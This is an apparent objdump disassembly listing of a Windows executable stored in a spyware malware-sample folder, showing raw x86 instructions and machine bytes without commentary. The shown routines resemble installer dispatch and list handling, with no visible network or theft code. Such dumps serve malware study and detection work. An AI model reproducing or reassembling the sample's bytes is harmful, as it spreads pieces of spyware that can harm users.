
malware_samples/spyware/d57525529cf0d87d3c74034ad9c0ad68e73a7ef0bc1fe9b60326151b8e2fafbc.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 5c             	sub    $0x5c,%esp
  401006:	83 7d 0c 0f          	cmpl   $0xf,0xc(%ebp)
  40100a:	74 2b                	je     0x401037
  40100c:	83 7d 0c 46          	cmpl   $0x46,0xc(%ebp)
  401010:	8b 45 14             	mov    0x14(%ebp),%eax
  401013:	75 0d                	jne    0x401022
  401015:	83 48 18 10          	orl    $0x10,0x18(%eax)
  401019:	8b 0d 24 f0 42 00    	mov    0x42f024,%ecx
  40101f:	89 48 04             	mov    %ecx,0x4(%eax)
  401022:	50                   	push   %eax
  401023:	ff 75 10             	push   0x10(%ebp)
  401026:	ff 75 0c             	push   0xc(%ebp)
  401029:	ff 75 08             	push   0x8(%ebp)
  40102c:	ff 15 3c 72 40 00    	call   *0x40723c
  401032:	e9 42 01 00 00       	jmp    0x401179
  401037:	53                   	push   %ebx
  401038:	56                   	push   %esi
  401039:	8b 35 28 f0 42 00    	mov    0x42f028,%esi
  40103f:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  401042:	57                   	push   %edi
  401043:	50                   	push   %eax
  401044:	ff 75 08             	push   0x8(%ebp)
  401047:	ff 15 40 72 40 00    	call   *0x407240
  40104d:	83 65 f4 00          	andl   $0x0,-0xc(%ebp)
  401051:	89 45 0c             	mov    %eax,0xc(%ebp)
  401054:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401057:	50                   	push   %eax
  401058:	ff 75 08             	push   0x8(%ebp)
  40105b:	ff 15 44 72 40 00    	call   *0x407244
  401061:	8b 7d f0             	mov    -0x10(%ebp),%edi
  401064:	83 65 f0 00          	andl   $0x0,-0x10(%ebp)
  401068:	8b 1d 44 70 40 00    	mov    0x407044,%ebx
  40106e:	e9 80 00 00 00       	jmp    0x4010f3
  401073:	0f b6 46 52          	movzbl 0x52(%esi),%eax
  401077:	0f b6 56 56          	movzbl 0x56(%esi),%edx
  40107b:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  40107f:	8b cf                	mov    %edi,%ecx
  401081:	2b 4d e8             	sub    -0x18(%ebp),%ecx
  401084:	0f af c1             	imul   %ecx,%eax
  401087:	03 c2                	add    %edx,%eax
  401089:	89 4d 10             	mov    %ecx,0x10(%ebp)
  40108c:	99                   	cltd
  40108d:	f7 ff                	idiv   %edi
  40108f:	33 d2                	xor    %edx,%edx
  401091:	8a f0                	mov    %al,%dh
  401093:	0f b6 46 51          	movzbl 0x51(%esi),%eax
  401097:	0f af c1             	imul   %ecx,%eax
  40109a:	0f b6 4e 55          	movzbl 0x55(%esi),%ecx
  40109e:	0f af 4d e8          	imul   -0x18(%ebp),%ecx
  4010a2:	03 c1                	add    %ecx,%eax
  4010a4:	8b ca                	mov    %edx,%ecx
  4010a6:	99                   	cltd
  4010a7:	f7 ff                	idiv   %edi
  4010a9:	0f b6 56 54          	movzbl 0x54(%esi),%edx
  4010ad:	0f af 55 e8          	imul   -0x18(%ebp),%edx
  4010b1:	8a c8                	mov    %al,%cl
  4010b3:	0f b6 46 50          	movzbl 0x50(%esi),%eax
  4010b7:	0f af 45 10          	imul   0x10(%ebp),%eax
  4010bb:	03 c2                	add    %edx,%eax
  4010bd:	99                   	cltd
  4010be:	f7 ff                	idiv   %edi
  4010c0:	c1 e1 08             	shl    $0x8,%ecx
  4010c3:	0f b6 c0             	movzbl %al,%eax
  4010c6:	0b c8                	or     %eax,%ecx
  4010c8:	8d 45 f4             	lea    -0xc(%ebp),%eax
  4010cb:	50                   	push   %eax
  4010cc:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4010cf:	ff 15 48 70 40 00    	call   *0x407048
  4010d5:	83 45 f0 04          	addl   $0x4,-0x10(%ebp)
  4010d9:	89 45 14             	mov    %eax,0x14(%ebp)
  4010dc:	50                   	push   %eax
  4010dd:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  4010e0:	50                   	push   %eax
  4010e1:	ff 75 0c             	push   0xc(%ebp)
  4010e4:	ff 15 48 72 40 00    	call   *0x407248
  4010ea:	ff 75 14             	push   0x14(%ebp)
  4010ed:	ff d3                	call   *%ebx
  4010ef:	83 45 e8 04          	addl   $0x4,-0x18(%ebp)
  4010f3:	39 7d e8             	cmp    %edi,-0x18(%ebp)
  4010f6:	0f 8c 77 ff ff ff    	jl     0x401073
  4010fc:	83 7e 58 ff          	cmpl   $0xffffffff,0x58(%esi)
  401100:	74 65                	je     0x401167
  401102:	ff 76 34             	push   0x34(%esi)
  401105:	ff 15 4c 70 40 00    	call   *0x40704c
  40110b:	85 c0                	test   %eax,%eax
  40110d:	89 45 14             	mov    %eax,0x14(%ebp)
  401110:	74 55                	je     0x401167
  401112:	8b 7d 0c             	mov    0xc(%ebp),%edi
  401115:	6a 01                	push   $0x1
  401117:	57                   	push   %edi
  401118:	c7 45 e4 10 00 00 00 	movl   $0x10,-0x1c(%ebp)
  40111f:	c7 45 e8 08 00 00 00 	movl   $0x8,-0x18(%ebp)
  401126:	ff 15 50 70 40 00    	call   *0x407050
  40112c:	ff 76 58             	push   0x58(%esi)
  40112f:	57                   	push   %edi
  401130:	ff 15 54 70 40 00    	call   *0x407054
  401136:	ff 75 14             	push   0x14(%ebp)
  401139:	8b 35 58 70 40 00    	mov    0x407058,%esi
  40113f:	57                   	push   %edi
  401140:	ff d6                	call   *%esi
  401142:	89 45 0c             	mov    %eax,0xc(%ebp)
  401145:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401148:	68 20 08 00 00       	push   $0x820
  40114d:	50                   	push   %eax
  40114e:	6a ff                	push   $0xffffffff
  401150:	68 20 e8 42 00       	push   $0x42e820
  401155:	57                   	push   %edi
  401156:	ff 15 4c 72 40 00    	call   *0x40724c
  40115c:	ff 75 0c             	push   0xc(%ebp)
  40115f:	57                   	push   %edi
  401160:	ff d6                	call   *%esi
  401162:	ff 75 14             	push   0x14(%ebp)
  401165:	ff d3                	call   *%ebx
  401167:	8d 45 a4             	lea    -0x5c(%ebp),%eax
  40116a:	50                   	push   %eax
  40116b:	ff 75 08             	push   0x8(%ebp)
  40116e:	ff 15 50 72 40 00    	call   *0x407250
  401174:	5f                   	pop    %edi
  401175:	5e                   	pop    %esi
  401176:	33 c0                	xor    %eax,%eax
  401178:	5b                   	pop    %ebx
  401179:	c9                   	leave
  40117a:	c2 10 00             	ret    $0x10
  40117d:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  401181:	a1 48 f0 42 00       	mov    0x42f048,%eax
  401186:	8b d1                	mov    %ecx,%edx
  401188:	53                   	push   %ebx
  401189:	69 d2 18 04 00 00    	imul   $0x418,%edx,%edx
  40118f:	56                   	push   %esi
  401190:	57                   	push   %edi
  401191:	8b 54 02 08          	mov    0x8(%edx,%eax,1),%edx
  401195:	f6 c2 02             	test   $0x2,%dl
  401198:	74 4f                	je     0x4011e9
  40119a:	8d 71 01             	lea    0x1(%ecx),%esi
  40119d:	33 ff                	xor    %edi,%edi
  40119f:	3b 35 4c f0 42 00    	cmp    0x42f04c,%esi
  4011a5:	73 42                	jae    0x4011e9
  4011a7:	8b ce                	mov    %esi,%ecx
  4011a9:	69 c9 18 04 00 00    	imul   $0x418,%ecx,%ecx
  4011af:	8d 44 01 08          	lea    0x8(%ecx,%eax,1),%eax
  4011b3:	8b 08                	mov    (%eax),%ecx
  4011b5:	f6 c1 02             	test   $0x2,%cl
  4011b8:	74 03                	je     0x4011bd
  4011ba:	47                   	inc    %edi
  4011bb:	eb 1e                	jmp    0x4011db
  4011bd:	f6 c1 04             	test   $0x4,%cl
  4011c0:	74 09                	je     0x4011cb
  4011c2:	8b cf                	mov    %edi,%ecx
  4011c4:	4f                   	dec    %edi
  4011c5:	85 c9                	test   %ecx,%ecx
  4011c7:	74 20                	je     0x4011e9
  4011c9:	eb 10                	jmp    0x4011db
  4011cb:	f6 c1 10             	test   $0x10,%cl
  4011ce:	75 0b                	jne    0x4011db
  4011d0:	8b d9                	mov    %ecx,%ebx
  4011d2:	33 da                	xor    %edx,%ebx
  4011d4:	83 e3 01             	and    $0x1,%ebx
  4011d7:	33 d9                	xor    %ecx,%ebx
  4011d9:	89 18                	mov    %ebx,(%eax)
  4011db:	46                   	inc    %esi
  4011dc:	05 18 04 00 00       	add    $0x418,%eax
  4011e1:	3b 35 4c f0 42 00    	cmp    0x42f04c,%esi
  4011e7:	72 ca                	jb     0x4011b3
  4011e9:	5f                   	pop    %edi
  4011ea:	5e                   	pop    %esi
  4011eb:	5b                   	pop    %ebx
  4011ec:	c2 04 00             	ret    $0x4
  4011ef:	55                   	push   %ebp
  4011f0:	8b ec                	mov    %esp,%ebp
  4011f2:	51                   	push   %ecx
  4011f3:	51                   	push   %ecx
  4011f4:	8b 55 08             	mov    0x8(%ebp),%edx
  4011f7:	53                   	push   %ebx
  4011f8:	56                   	push   %esi
  4011f9:	8b f2                	mov    %edx,%esi
  4011fb:	69 f6 18 04 00 00    	imul   $0x418,%esi,%esi
  401201:	8b 1d 48 f0 42 00    	mov    0x42f048,%ebx
  401207:	33 c9                	xor    %ecx,%ecx
  401209:	03 f3                	add    %ebx,%esi
  40120b:	57                   	push   %edi
  40120c:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  40120f:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  401212:	8b 46 08             	mov    0x8(%esi),%eax
  401215:	a8 02                	test   $0x2,%al
  401217:	74 0b                	je     0x401224
  401219:	39 4d 0c             	cmp    %ecx,0xc(%ebp)
  40121c:	74 06                	je     0x401224
  40121e:	24 be                	and    $0xbe,%al
  401220:	42                   	inc    %edx
  401221:	89 46 08             	mov    %eax,0x8(%esi)
  401224:	3b 15 4c f0 42 00    	cmp    0x42f04c,%edx
  40122a:	73 44                	jae    0x401270
  40122c:	8b c2                	mov    %edx,%eax
  40122e:	69 c0 18 04 00 00    	imul   $0x418,%eax,%eax
  401234:	8d 7c 18 08          	lea    0x8(%eax,%ebx,1),%edi
  401238:	8d 42 01             	lea    0x1(%edx),%eax
  40123b:	8b 0f                	mov    (%edi),%ecx
  40123d:	f6 c1 02             	test   $0x2,%cl
  401240:	74 0a                	je     0x40124c
  401242:	6a 01                	push   $0x1
  401244:	52                   	push   %edx
  401245:	e8 a5 ff ff ff       	call   0x4011ef
  40124a:	8b 0f                	mov    (%edi),%ecx
  40124c:	f6 c1 04             	test   $0x4,%cl
  40124f:	75 28                	jne    0x401279
  401251:	f6 c1 40             	test   $0x40,%cl
  401254:	74 03                	je     0x401259
  401256:	ff 45 fc             	incl   -0x4(%ebp)
  401259:	f6 c1 01             	test   $0x1,%cl
  40125c:	74 05                	je     0x401263
  40125e:	ff 45 fc             	incl   -0x4(%ebp)
  401261:	eb 03                	jmp    0x401266
  401263:	ff 45 f8             	incl   -0x8(%ebp)
  401266:	3b 05 4c f0 42 00    	cmp    0x42f04c,%eax
  40126c:	8b d0                	mov    %eax,%edx
  40126e:	72 bc                	jb     0x40122c
  401270:	33 c0                	xor    %eax,%eax
  401272:	5f                   	pop    %edi
  401273:	5e                   	pop    %esi
  401274:	5b                   	pop    %ebx
  401275:	c9                   	leave
  401276:	c2 08 00             	ret    $0x8
  401279:	83 7d fc 00          	cmpl   $0x0,-0x4(%ebp)
  40127d:	74 f3                	je     0x401272
  40127f:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  401283:	74 06                	je     0x40128b
  401285:	83 4e 08 40          	orl    $0x40,0x8(%esi)
  401289:	eb e7                	jmp    0x401272
  40128b:	8b 4e 08             	mov    0x8(%esi),%ecx
  40128e:	80 e1 7f             	and    $0x7f,%cl
  401291:	83 c9 01             	or     $0x1,%ecx
  401294:	89 4e 08             	mov    %ecx,0x8(%esi)
  401297:	eb d9                	jmp    0x401272
  401299:	8b 4c 24 04          	mov    0x4(%esp),%ecx
  40129d:	a1 48 f0 42 00       	mov    0x42f048,%eax
  4012a2:	56                   	push   %esi
  4012a3:	33 f6                	xor    %esi,%esi
  4012a5:	83 f9 20             	cmp    $0x20,%ecx
  4012a8:	73 34                	jae    0x4012de
  4012aa:	39 35 4c f0 42 00    	cmp    %esi,0x42f04c
  4012b0:	76 2c                	jbe    0x4012de
  4012b2:	8d 50 08             	lea    0x8(%eax),%edx
  4012b5:	57                   	push   %edi
  4012b6:	8b 02                	mov    (%edx),%eax
  4012b8:	a8 06                	test   $0x6,%al
  4012ba:	75 12                	jne    0x4012ce
  4012bc:	33 ff                	xor    %edi,%edi
  4012be:	47                   	inc    %edi
  4012bf:	d3 e7                	shl    %cl,%edi
  4012c1:	85 7a fc             	test   %edi,-0x4(%edx)
  4012c4:	74 04                	je     0x4012ca
  4012c6:	0c 01                	or     $0x1,%al
  4012c8:	eb 02                	jmp    0x4012cc
  4012ca:	24 fe                	and    $0xfe,%al
  4012cc:	89 02                	mov    %eax,(%edx)
  4012ce:	46                   	inc    %esi
  4012cf:	81 c2 18 04 00 00    	add    $0x418,%edx
  4012d5:	3b 35 4c f0 42 00    	cmp    0x42f04c,%esi
  4012db:	72 d9                	jb     0x4012b6
  4012dd:	5f                   	pop    %edi
  4012de:	5e                   	pop    %esi
  4012df:	c2 04 00             	ret    $0x4
  4012e2:	55                   	push   %ebp
  4012e3:	8b ec                	mov    %esp,%ebp
  4012e5:	83 ec 0c             	sub    $0xc,%esp
  4012e8:	a1 28 f0 42 00       	mov    0x42f028,%eax
  4012ed:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  4012f1:	53                   	push   %ebx
  4012f2:	56                   	push   %esi
  4012f3:	05 94 00 00 00       	add    $0x94,%eax
  4012f8:	57                   	push   %edi
  4012f9:	8b 3d 4c f0 42 00    	mov    0x42f04c,%edi
  4012ff:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401302:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401305:	33 db                	xor    %ebx,%ebx
  401307:	39 18                	cmp    %ebx,(%eax)
  401309:	74 4b                	je     0x401356
  40130b:	3b df                	cmp    %edi,%ebx
  40130d:	73 45                	jae    0x401354
  40130f:	8b 35 48 f0 42 00    	mov    0x42f048,%esi
  401315:	83 c6 08             	add    $0x8,%esi
  401318:	8b 16                	mov    (%esi),%edx
  40131a:	f6 c2 06             	test   $0x6,%dl
  40131d:	75 28                	jne    0x401347
  40131f:	8b 45 08             	mov    0x8(%ebp),%eax
  401322:	85 c0                	test   %eax,%eax
  401324:	74 06                	je     0x40132c
  401326:	83 3c 98 00          	cmpl   $0x0,(%eax,%ebx,4)
  40132a:	74 1b                	je     0x401347
  40132c:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  40132f:	33 c0                	xor    %eax,%eax
  401331:	40                   	inc    %eax
  401332:	83 e2 01             	and    $0x1,%edx
  401335:	d3 e0                	shl    %cl,%eax
  401337:	8b 4e fc             	mov    -0x4(%esi),%ecx
  40133a:	23 c8                	and    %eax,%ecx
  40133c:	8b c1                	mov    %ecx,%eax
  40133e:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401341:	d3 e2                	shl    %cl,%edx
  401343:	3b c2                	cmp    %edx,%eax
  401345:	75 0b                	jne    0x401352
  401347:	43                   	inc    %ebx
  401348:	81 c6 18 04 00 00    	add    $0x418,%esi
  40134e:	3b df                	cmp    %edi,%ebx
  401350:	72 c6                	jb     0x401318
  401352:	3b df                	cmp    %edi,%ebx
  401354:	74 0d                	je     0x401363
  401356:	ff 45 fc             	incl   -0x4(%ebp)
  401359:	83 45 f8 04          	addl   $0x4,-0x8(%ebp)
  40135d:	83 7d fc 20          	cmpl   $0x20,-0x4(%ebp)
  401361:	72 9f                	jb     0x401302
  401363:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401366:	5f                   	pop    %edi
  401367:	5e                   	pop    %esi
  401368:	5b                   	pop    %ebx
  401369:	c9                   	leave
  40136a:	c2 04 00             	ret    $0x4
  40136d:	56                   	push   %esi
  40136e:	8b 74 24 08          	mov    0x8(%esp),%esi
  401372:	e9 84 00 00 00       	jmp    0x4013fb
  401377:	8b c6                	mov    %esi,%eax
  401379:	8b 0d 50 f0 42 00    	mov    0x42f050,%ecx
  40137f:	6b c0 1c             	imul   $0x1c,%eax,%eax
  401382:	03 c1                	add    %ecx,%eax
  401384:	83 38 01             	cmpl   $0x1,(%eax)
  401387:	74 7a                	je     0x401403
  401389:	50                   	push   %eax
  40138a:	e8 aa 00 00 00       	call   0x401439
  40138f:	3d ff ff ff 7f       	cmp    $0x7fffffff,%eax
  401394:	74 73                	je     0x401409
  401396:	85 c0                	test   %eax,%eax
  401398:	7d 13                	jge    0x4013ad
  40139a:	40                   	inc    %eax
  40139b:	b9 00 00 43 00       	mov    $0x430000,%ecx
  4013a0:	c1 e0 0a             	shl    $0xa,%eax
  4013a3:	2b c8                	sub    %eax,%ecx
  4013a5:	51                   	push   %ecx
  4013a6:	e8 70 45 00 00       	call   0x40591b
  4013ab:	85 c0                	test   %eax,%eax
  4013ad:	75 06                	jne    0x4013b5
  4013af:	33 c0                	xor    %eax,%eax
  4013b1:	40                   	inc    %eax
  4013b2:	46                   	inc    %esi
  4013b3:	eb 07                	jmp    0x4013bc
  4013b5:	48                   	dec    %eax
  4013b6:	8b ce                	mov    %esi,%ecx
  4013b8:	8b f0                	mov    %eax,%esi
  4013ba:	2b c1                	sub    %ecx,%eax
  4013bc:	83 7c 24 0c 00       	cmpl   $0x0,0xc(%esp)
  4013c1:	74 38                	je     0x4013fb
  4013c3:	01 05 0c e8 42 00    	add    %eax,0x42e80c
  4013c9:	a1 f4 e7 42 00       	mov    0x42e7f4,%eax
  4013ce:	33 c9                	xor    %ecx,%ecx
  4013d0:	6a 00                	push   $0x0
  4013d2:	85 c0                	test   %eax,%eax
  4013d4:	0f 94 c1             	sete   %cl
  4013d7:	03 c8                	add    %eax,%ecx
  4013d9:	51                   	push   %ecx
  4013da:	68 30 75 00 00       	push   $0x7530
  4013df:	ff 35 0c e8 42 00    	push   0x42e80c
  4013e5:	ff 15 28 71 40 00    	call   *0x407128
  4013eb:	50                   	push   %eax
  4013ec:	68 02 04 00 00       	push   $0x402
  4013f1:	ff 74 24 18          	push   0x18(%esp)
  4013f5:	ff 15 38 72 40 00    	call   *0x407238
  4013fb:	85 f6                	test   %esi,%esi
  4013fd:	0f 8d 74 ff ff ff    	jge    0x401377
  401403:	33 c0                	xor    %eax,%eax
  401405:	5e                   	pop    %esi
  401406:	c2 08 00             	ret    $0x8
  401409:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
  40140e:	eb f5                	jmp    0x401405
  401410:	8b 44 24 04          	mov    0x4(%esp),%eax
  401414:	8b 0d 28 f0 42 00    	mov    0x42f028,%ecx
  40141a:	6a 00                	push   $0x0
  40141c:	ff 74 81 6c          	push   0x6c(%ecx,%eax,4)
  401420:	e8 48 ff ff ff       	call   0x40136d
  401425:	c2 04 00             	ret    $0x4
  401428:	68 e8 9f 40 00       	push   $0x409fe8
  40142d:	ff 74 24 08          	push   0x8(%esp)
  401431:	e8 33 39 00 00       	call   0x404d69
  401436:	c2 04 00             	ret    $0x4
  401439:	55                   	push   %ebp
  40143a:	8b ec                	mov    %esp,%ebp
  40143c:	81 ec a4 01 00 00    	sub    $0x1a4,%esp
  401442:	a1 24 f0 42 00       	mov    0x42f024,%eax
  401447:	53                   	push   %ebx
  401448:	56                   	push   %esi
  401449:	8b 75 08             	mov    0x8(%ebp),%esi
  40144c:	57                   	push   %edi
  40144d:	6a 07                	push   $0x7
  40144f:	59                   	pop    %ecx
  401450:	8d 7d d8             	lea    -0x28(%ebp),%edi
  401453:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401456:	33 db                	xor    %ebx,%ebx
  401458:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40145a:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40145d:	8b 7d e0             	mov    -0x20(%ebp),%edi
  401460:	8b f0                	mov    %eax,%esi
  401462:	b9 00 00 43 00       	mov    $0x430000,%ecx
  401467:	c1 e6 0a             	shl    $0xa,%esi
  40146a:	c1 e7 0a             	shl    $0xa,%edi
  40146d:	03 f1                	add    %ecx,%esi
  40146f:	03 f9                	add    %ecx,%edi
  401471:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  401474:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  401477:	89 0d e0 9b 40 00    	mov    %ecx,0x409be0
  40147d:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  401480:	83 c1 fe             	add    $0xfffffffe,%ecx
  401483:	83 f9 41             	cmp    $0x41,%ecx
  401486:	0f 87 a6 14 00 00    	ja     0x402932
  40148c:	ff 24 8d 44 29 40 00 	jmp    *0x402944(,%ecx,4)
  401493:	53                   	push   %ebx
  401494:	50                   	push   %eax
  401495:	e8 cf 38 00 00       	call   0x404d69
  40149a:	e9 f1 0d 00 00       	jmp    0x402290
  40149f:	ff 05 ec e7 42 00    	incl   0x42e7ec
  4014a5:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4014a8:	0f 84 e2 0d 00 00    	je     0x402290
  4014ae:	53                   	push   %ebx
  4014af:	ff 15 ec 71 40 00    	call   *0x4071ec
  4014b5:	e9 d6 0d 00 00       	jmp    0x402290
  4014ba:	3b c3                	cmp    %ebx,%eax
  4014bc:	7d 11                	jge    0x4014cf
  4014be:	40                   	inc    %eax
  4014bf:	b9 00 00 43 00       	mov    $0x430000,%ecx
  4014c4:	c1 e0 0a             	shl    $0xa,%eax
  4014c7:	2b c8                	sub    %eax,%ecx
  4014c9:	51                   	push   %ecx
  4014ca:	e8 4c 44 00 00       	call   0x40591b
  4014cf:	48                   	dec    %eax
  4014d0:	53                   	push   %ebx
  4014d1:	50                   	push   %eax
  4014d2:	e8 96 fe ff ff       	call   0x40136d
  4014d7:	e9 61 14 00 00       	jmp    0x40293d
  4014dc:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  4014df:	3b cb                	cmp    %ebx,%ecx
  4014e1:	74 29                	je     0x40150c
  4014e3:	f6 c1 08             	test   $0x8,%cl
  4014e6:	74 0f                	je     0x4014f7
  4014e8:	a1 0c 90 40 00       	mov    0x40900c,%eax
  4014ed:	a3 8c 92 40 00       	mov    %eax,0x40928c
  4014f2:	e9 3b 14 00 00       	jmp    0x402932
  4014f7:	a1 8c 92 40 00       	mov    0x40928c,%eax
  4014fc:	89 0d 8c 92 40 00    	mov    %ecx,0x40928c
  401502:	a3 0c 90 40 00       	mov    %eax,0x40900c
  401507:	e9 26 14 00 00       	jmp    0x402932
  40150c:	53                   	push   %ebx
  40150d:	50                   	push   %eax
  40150e:	e8 56 38 00 00       	call   0x404d69
  401513:	e9 1a 14 00 00       	jmp    0x402932
  401518:	53                   	push   %ebx
  401519:	e8 62 15 00 00       	call   0x402a80
  40151e:	83 f8 01             	cmp    $0x1,%eax
  401521:	7f 03                	jg     0x401526
  401523:	33 c0                	xor    %eax,%eax
  401525:	40                   	inc    %eax
  401526:	50                   	push   %eax
  401527:	ff 15 8c 70 40 00    	call   *0x40708c
  40152d:	e9 00 14 00 00       	jmp    0x402932
  401532:	ff 75 f8             	push   -0x8(%ebp)
  401535:	ff 15 f0 71 40 00    	call   *0x4071f0
  40153b:	e9 f2 13 00 00       	jmp    0x402932
  401540:	6a 01                	push   $0x1
  401542:	e8 39 15 00 00       	call   0x402a80
  401547:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40154a:	89 04 8d a0 f0 42 00 	mov    %eax,0x42f0a0(,%ecx,4)
  401551:	e9 dc 13 00 00       	jmp    0x402932
  401556:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  401559:	8d 34 85 a0 f0 42 00 	lea    0x42f0a0(,%eax,4),%esi
  401560:	33 c0                	xor    %eax,%eax
  401562:	8b 0e                	mov    (%esi),%ecx
  401564:	3b cb                	cmp    %ebx,%ecx
  401566:	0f 94 c0             	sete   %al
  401569:	23 4d e8             	and    -0x18(%ebp),%ecx
  40156c:	8b 44 85 dc          	mov    -0x24(%ebp,%eax,4),%eax
  401570:	89 0e                	mov    %ecx,(%esi)
  401572:	e9 c6 13 00 00       	jmp    0x40293d
  401577:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40157a:	ff 34 85 a0 f0 42 00 	push   0x42f0a0(,%eax,4)
  401581:	56                   	push   %esi
  401582:	e9 53 13 00 00       	jmp    0x4028da
  401587:	8b 0d f0 e7 42 00    	mov    0x42e7f0,%ecx
  40158d:	8b 35 f4 71 40 00    	mov    0x4071f4,%esi
  401593:	3b cb                	cmp    %ebx,%ecx
  401595:	74 09                	je     0x4015a0
  401597:	ff 75 e0             	push   -0x20(%ebp)
  40159a:	51                   	push   %ecx
  40159b:	ff d6                	call   *%esi
  40159d:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4015a0:	8b 0d 04 e8 42 00    	mov    0x42e804,%ecx
  4015a6:	3b cb                	cmp    %ebx,%ecx
  4015a8:	0f 84 84 13 00 00    	je     0x402932
  4015ae:	50                   	push   %eax
  4015af:	51                   	push   %ecx
  4015b0:	ff d6                	call   *%esi
  4015b2:	e9 7b 13 00 00       	jmp    0x402932
  4015b7:	6a f0                	push   $0xfffffff0
  4015b9:	e8 df 14 00 00       	call   0x402a9d
  4015be:	ff 75 e0             	push   -0x20(%ebp)
  4015c1:	50                   	push   %eax
  4015c2:	ff 15 88 70 40 00    	call   *0x407088
  4015c8:	85 c0                	test   %eax,%eax
  4015ca:	0f 85 62 13 00 00    	jne    0x402932
  4015d0:	e9 02 11 00 00       	jmp    0x4026d7
  4015d5:	6a f0                	push   $0xfffffff0
  4015d7:	e8 c1 14 00 00       	call   0x402a9d
  4015dc:	8b f8                	mov    %eax,%edi
  4015de:	57                   	push   %edi
  4015df:	e8 4c 3f 00 00       	call   0x405530
  4015e4:	8b f0                	mov    %eax,%esi
  4015e6:	3b f3                	cmp    %ebx,%esi
  4015e8:	74 42                	je     0x40162c
  4015ea:	6a 5c                	push   $0x5c
  4015ec:	56                   	push   %esi
  4015ed:	e8 d6 3e 00 00       	call   0x4054c8
  4015f2:	8b f0                	mov    %eax,%esi
  4015f4:	53                   	push   %ebx
  4015f5:	57                   	push   %edi
  4015f6:	8a 06                	mov    (%esi),%al
  4015f8:	88 1e                	mov    %bl,(%esi)
  4015fa:	88 45 0b             	mov    %al,0xb(%ebp)
  4015fd:	ff 15 84 70 40 00    	call   *0x407084
  401603:	85 c0                	test   %eax,%eax
  401605:	75 1b                	jne    0x401622
  401607:	ff 15 80 70 40 00    	call   *0x407080
  40160d:	3d b7 00 00 00       	cmp    $0xb7,%eax
  401612:	75 0b                	jne    0x40161f
  401614:	57                   	push   %edi
  401615:	ff 15 7c 70 40 00    	call   *0x40707c
  40161b:	a8 10                	test   $0x10,%al
  40161d:	75 03                	jne    0x401622
  40161f:	ff 45 fc             	incl   -0x4(%ebp)
  401622:	8a 45 0b             	mov    0xb(%ebp),%al
  401625:	88 06                	mov    %al,(%esi)
  401627:	46                   	inc    %esi
  401628:	3a c3                	cmp    %bl,%al
  40162a:	75 be                	jne    0x4015ea
  40162c:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40162f:	74 1e                	je     0x40164f
  401631:	6a e6                	push   $0xffffffe6
  401633:	e8 f0 fd ff ff       	call   0x401428
  401638:	57                   	push   %edi
  401639:	68 00 58 43 00       	push   $0x435800
  40163e:	e8 61 43 00 00       	call   0x4059a4
  401643:	57                   	push   %edi
  401644:	ff 15 78 70 40 00    	call   *0x407078
  40164a:	e9 e3 12 00 00       	jmp    0x402932
  40164f:	6a f5                	push   $0xfffffff5
  401651:	e9 8f 0b 00 00       	jmp    0x4021e5
  401656:	53                   	push   %ebx
  401657:	e8 41 14 00 00       	call   0x402a9d
  40165c:	50                   	push   %eax
  40165d:	e8 0a 46 00 00       	call   0x405c6c
  401662:	e9 7b 06 00 00       	jmp    0x401ce2
  401667:	6a d0                	push   $0xffffffd0
  401669:	e8 2f 14 00 00       	call   0x402a9d
  40166e:	6a df                	push   $0xffffffdf
  401670:	89 45 08             	mov    %eax,0x8(%ebp)
  401673:	e8 25 14 00 00       	call   0x402a9d
  401678:	ff 75 08             	push   0x8(%ebp)
  40167b:	be e8 9f 40 00       	mov    $0x409fe8,%esi
  401680:	89 45 f8             	mov    %eax,-0x8(%ebp)
  401683:	56                   	push   %esi
  401684:	e8 1b 43 00 00       	call   0x4059a4
  401689:	ff 75 f8             	push   -0x8(%ebp)
  40168c:	e8 29 43 00 00       	call   0x4059ba
  401691:	ff 75 08             	push   0x8(%ebp)
  401694:	8b f8                	mov    %eax,%edi
  401696:	e8 1f 43 00 00       	call   0x4059ba
  40169b:	03 f8                	add    %eax,%edi
  40169d:	81 ff fd 03 00 00    	cmp    $0x3fd,%edi
  4016a3:	7d 14                	jge    0x4016b9
  4016a5:	68 1c 90 40 00       	push   $0x40901c
  4016aa:	56                   	push   %esi
  4016ab:	e8 10 43 00 00       	call   0x4059c0
  4016b0:	ff 75 f8             	push   -0x8(%ebp)
  4016b3:	56                   	push   %esi
  4016b4:	e8 07 43 00 00       	call   0x4059c0
  4016b9:	ff 75 f8             	push   -0x8(%ebp)
  4016bc:	ff 75 08             	push   0x8(%ebp)
  4016bf:	ff 15 74 70 40 00    	call   *0x407074
  4016c5:	85 c0                	test   %eax,%eax
  4016c7:	74 07                	je     0x4016d0
  4016c9:	6a e3                	push   $0xffffffe3
  4016cb:	e9 15 0b 00 00       	jmp    0x4021e5
  4016d0:	39 5d e4             	cmp    %ebx,-0x1c(%ebp)
  4016d3:	0f 84 fe 0f 00 00    	je     0x4026d7
